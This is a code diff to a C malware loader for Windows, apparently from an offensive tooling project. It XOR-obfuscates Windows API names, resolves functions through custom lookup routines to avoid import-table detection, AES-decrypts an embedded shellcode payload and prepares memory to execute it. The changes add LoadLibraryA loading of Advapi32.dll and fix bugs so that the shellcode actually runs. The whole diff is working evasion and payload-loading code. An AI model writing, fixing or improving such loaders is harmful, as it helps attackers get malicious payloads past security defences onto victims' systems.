@@ -10,12 +10,13 @@
 #pragma comment (lib, "advapi32")
 
 /*------[INSTRUCT THE LINKER TO CONSIDER "WinMain" FUNCTION AS THE ENTRYPOINT]------*/
-#pragma comment(linker, "/entry:WinMain")
+#pragma comment(linker, "/entry=WinMain")
 
 /*------[DEFINE A TYPEDEF FOR A POINTER TO THE FUNCTIONS USED IN WINDOWS API]------*/
 typedef LPVOID (WINAPI * VirtualAlloc_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 typedef BOOL (WINAPI * VirtualProtect_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
 typedef VOID (WINAPI * RtlMoveMemory_DT)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
+typedef HMODULE (WINAPI * LoadLibraryA_DT)(LPCSTR lpLibFileName);
 typedef HANDLE (WINAPI * CreateThread_DT)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 typedef DWORD (WINAPI * WaitForSingleObject_DT)(HANDLE hHandle, DWORD dwMilliseconds);
 typedef BOOL (WINAPI * CryptAcquireContextW_DT)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
@@ -28,7 +29,7 @@ typedef BOOL (WINAPI * CryptDestroyHash_DT)(HCRYPTHASH hHash);
 typedef BOOL (WINAPI * CryptDestroyKey_DT)(HCRYPTKEY hKey);
 
 /*------[XOR FUNCTION]------*/
-void xor(char *data, const char *key, size_t data_len, size_t key_len) {
+void xored(char *data, const char *key, size_t data_len, size_t key_len) {
 
     size_t i;
     for (i = 0; i < data_len; i++) {
@@ -41,54 +42,55 @@ int AESDecrypt(char * payload, unsigned int payloadLen, char * key, unsigned int
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
-    // unsigned char xored[] = {0x31, 0x3f, 0x2d, 0x34, 0x2e, 0x0e, 0x2e, 0x28, 0x19, 0x17, 0x65};
-    // xor((char *) xored, "YZAXAYAZuser32.dllHXAYZ>H", sizeof(xored), strlen("YZAXAYAZuser32.dllHXAYZ>H"));
+    HMODULE hdAdvapi32;
 
-    CryptAcquireContextW_DT pCryptAcquireContextW = (CryptAcquireContextW_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptAcquireContextW");
+    hdAdvapi32 = CustomGetModuleHandle(L"Advapi32.dll");
+    CryptAcquireContextW_DT pCryptAcquireContextW = (CryptAcquireContextW_DT) CustomGetProcAddress(hdAdvapi32, (char *) "CryptAcquireContextW");
     if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         return -1;
     }
 
     // The shellcode does not get executed if this function is resolved. No idea Why !!
-    CryptCreateHash_DT pCryptCreateHash = (CryptCreateHash_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptCreateHash");
+    CryptCreateHash_DT pCryptCreateHash = (CryptCreateHash_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptCreateHash");
     if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
         return -1;
     }
     
-    CryptHashData_DT pCryptHashData = (CryptHashData_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptHashData");
+    CryptHashData_DT pCryptHashData = (CryptHashData_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptHashData");
     if (!pCryptHashData(hHash, (BYTE *) key, (DWORD) keyLen, 0)) {
         return -1;
     }
     
-    CryptDeriveKey_DT pCryptDeriveKey = (CryptDeriveKey_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDeriveKey");
+    CryptDeriveKey_DT pCryptDeriveKey = (CryptDeriveKey_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptDeriveKey");
     if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
         return -1;
     }
     
-    CryptDecrypt_DT pCryptDecrypt = (CryptDecrypt_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDecrypt");
+    CryptDecrypt_DT pCryptDecrypt = (CryptDecrypt_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptDecrypt");
     if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payloadLen)) {
         return -1;
     }
 
-    CryptReleaseContext_DT pCryptReleaseContext = (CryptReleaseContext_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptReleaseContext");
+    CryptReleaseContext_DT pCryptReleaseContext = (CryptReleaseContext_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptReleaseContext");
     pCryptReleaseContext(hProv, 0);
 
-    CryptDestroyHash_DT pCryptDestroyHash = (CryptDestroyHash_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDestroyHash");
+    CryptDestroyHash_DT pCryptDestroyHash = (CryptDestroyHash_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptDestroyHash");
     pCryptDestroyHash(hHash);
 
-    CryptDestroyKey_DT pCryptDestroyKey = (CryptDestroyKey_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Advapi32.dll"), "CryptDestroyKey");
-    CryptDestroyKey(hKey);
+    CryptDestroyKey_DT pCryptDestroyKey = (CryptDestroyKey_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptDestroyKey");
+    pCryptDestroyKey(hKey);
     
     return 0;
 }
 
 
 // int main(void) {
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
     /*------[ENCRYPTED API CALLS]------*/
     unsigned char sVAlloc[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x1b, 0x19, 0x1f, 0x0a, 0x11, 0x33};
     unsigned char sVProt[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x0a, 0x07, 0x1c, 0x11, 0x17, 0x50, 0x46, 0x2e};
+    unsigned char sLLib[] = { 0x15, 0x35, 0x20, 0x3c, 0x0d, 0x30, 0x23, 0x28, 0x14, 0x01, 0x1c, 0x33, 0x33 };
     unsigned char sRMV[] = {0x0b, 0x2e, 0x2d, 0x15, 0x2e, 0x2f, 0x24, 0x17, 0x10, 0x1e, 0x0a, 0x00, 0x4a, 0x32};
     unsigned char sCT[] = {0x1a, 0x28, 0x24, 0x39, 0x35, 0x3c, 0x15, 0x32, 0x07, 0x16, 0x04, 0x16, 0x33};
     unsigned char sWFSO[] = {0x0e, 0x3b, 0x28, 0x2c, 0x07, 0x36, 0x33, 0x09, 0x1c, 0x1d, 0x02, 0x1e, 0x56, 0x7d, 0x4c, 0x0e, 0x09, 0x0f, 0x3c, 0x58};
@@ -113,11 +115,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     char sk[] = "YZAXAYAZuser32.dllHXAYZ>H";
 
     /*------[DECRYPTING API FUNCTIONS]------*/
-    xor((char *) sVAlloc, sk, sizeof(sVAlloc), strlen(sk));
-    xor((char *) sVProt, sk, sizeof(sVProt), strlen(sk));
-    xor((char *) sRMV, sk, sizeof(sRMV), strlen(sk));
-    xor((char *) sCT, sk, sizeof(sCT), strlen(sk));
-    xor((char *) sWFSO, sk, sizeof(sWFSO), strlen(sk));
+    xored((char *) sVAlloc, sk, sizeof(sVAlloc), strlen(sk));
+    xored((char *) sVProt, sk, sizeof(sVProt), strlen(sk));
+    xored((char*)sLLib, sk, sizeof(sLLib), strlen(sk));
+    xored((char *) sRMV, sk, sizeof(sRMV), strlen(sk));
+    xored((char *) sCT, sk, sizeof(sCT), strlen(sk));
+    xored((char *) sWFSO, sk, sizeof(sWFSO), strlen(sk));
 
     /*------[DECLARED VARIABLES]------*/
     LPVOID ExecMem;
@@ -128,6 +131,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /*------[ALLOCATE MEMORY BUFFER]------*/
     VirtualAlloc_DT pVirtualAlloc = (VirtualAlloc_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char *) sVAlloc);
     ExecMem = pVirtualAlloc(0, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    /*------[LOAD ADVAPI32.DLL INTO MEMORY]------*/
+    LoadLibraryA_DT pLoadLibraryA = (LoadLibraryA_DT) CustomGetProcAddress(CustomGetModuleHandle(L"Kernel32.dll"), (char*) sLLib);
+    pLoadLibraryA("Advapi32.dll");
 
     /*------[DECRYPT THE SHELLCODE]------*/
     AESDecrypt((char *) shellcode, shellcodeLen,(char *) AESKey, AESKeyLen);
